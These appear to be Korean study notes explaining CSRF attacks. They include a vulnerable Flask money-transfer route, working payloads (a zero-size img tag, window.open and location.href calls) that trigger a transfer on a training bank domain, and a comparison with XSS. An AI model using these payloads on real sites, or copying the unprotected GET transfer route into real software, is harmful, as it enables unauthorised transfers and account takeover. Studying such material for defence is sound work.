# CSRF(Cross Site Request Forgery )
- 사이트 간 요청 위조. 이용자가 자신의 의지와는 무관하게 공격자가 의도한 행위를 특정 웹사이트에 요청하게 만드는 공격.
- 임의 이용자의 권한으로 임의 주소에 HTTP 요청을 보낼 수 있는 취약점  
  이용자의 입력을 유도하고, 이용자가 값을 입력하면 이를 은행이나 중요 포털 사이트 등으로 전송하여 마치 이용자가 동의한 것 같은 요청을 발생시킴.
- 이용자의 계정으로 임의 금액을 송금해 금전적인 이득을 취하거나 비밀번호를 변경해 계정을 탈취하고, 관리자 계정을 공격해 공지사항 작성 등으로 혼란을 야기할 수 있음.

```http
GET /sendmoney?to=dreamhack&amount=1337 HTTP/1.1
Host: bank.dreamhack.io
Cookie: session=IeheighaiToo4eenahw3
```

```py
# 이용자가 /sendmoney에 접속했을때 아래와 같은 송금 기능을 웹 서비스가 실행함.
@app.route('/sendmoney')
def sendmoney(name):
    # 송금을 받는 사람과 금액을 입력받음.
    to_user = request.args.get('to')
	amount = int(request.args.get('amount'))
	
	# 송금 기능 실행 후, 결과 반환	
	success_status = send_money(to_user, amount)
	
	# 송금이 성공했을 때,
	if success_status:
	    # 성공 메시지 출력
		return "Send success."
	# 송금이 실패했을 때,
	else:
	    # 실패 메시지 출력
		return "Send fail."
```

### Cross Site Request Forgery 동작
- CSRF 공격에 성공하기 위해서는 공격자가 작성한 악성 스크립트를 이용자가 실행해야 함.
- 공격자가 이용자에게 메일을 보내거나 게시판에 글을 작성해 이용자가 이를 조회하도록 유도하는 방법이 있음.
- CSRF 공격 스크립트는 HTML 또는 Javascript를 통해 작성할 수 있음.

### HTML으로 작성한 스크립트
이미지를 불러오는 img 태그를 사용하거나 웹 페이지에 입력된 양식을 전송하는 form 태그를 사용하는 방법이 있음. 이 두 개의 태그를 사용해 HTTP 요청을 보내면 HTTP 헤더인 Cookie에 이용자의 인증 정보가 포함 됨.
```html
<img src="https://test.dreamhack.io/main-long.png">
<form action="https://test.dreamhack.io/users/1" method="post">
    <input name="user">
    <input name="pass">
    <input type="submit">
</form>
```

```http
GET /main-logo.png HTTP/1.1
HOST: test.dreamhack.io
Cookie: session_id=503403303

POST /users/1 HTTP/1.1
Host: test.dreamhack.io
Cookie: session_id=97djkdfjdklf
user=dream&pass=hack
```

### img 태그를 사용한 스크립트의 예시
해당 태그는 이미지의 크기를 줄일 수 있는 옵션을 제공함. 이를 활용하면 이용자에게 들키지않고 임의 페이지에 요청을 보낼 수 있음.
```html
<img src='http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337' width=0px height=0px>
```

### Javascript로 작성된 스크립트의 예시
새로운 창을 띄우고, 현재 창의 주소를 옮기는 등의 행위가 가능
```js
/* 새 창 띄우기 */
window.open('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
/* 현재 창 주소 옮기기 */
location.href = 'http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337';
location.replace('http://bank.dreamhack.io/sendmoney?to=dreamhack&amount=1337');
```

### XSS와 CSRF의 차이
- 공통점
    두 개의 취약점은 모두 클라이언트를 대상으로 하는 공격이며, 이용자가 악성 스크립트가 포함된 페이지에 접속하도록 유도해야 함.
- 차이점
    서로 다른 목적을 가짐. 
    XSS는 인증 정보인 세션 및 쿠키 탈취를 목적으로 하는 공격이며, 공격할 사이트의 오리진에서 스크립트를 실행시킴.
    CSRF는 이용자가 임의 페이지에 HTTP 요청을 보내는 것을 목적으로 하는 공격. 공격자는 악성 스크립트가 포함된 페이지에 접근한 이용자의 권한으로 웹 서비스의 임의 기능을 실행할 수 있음.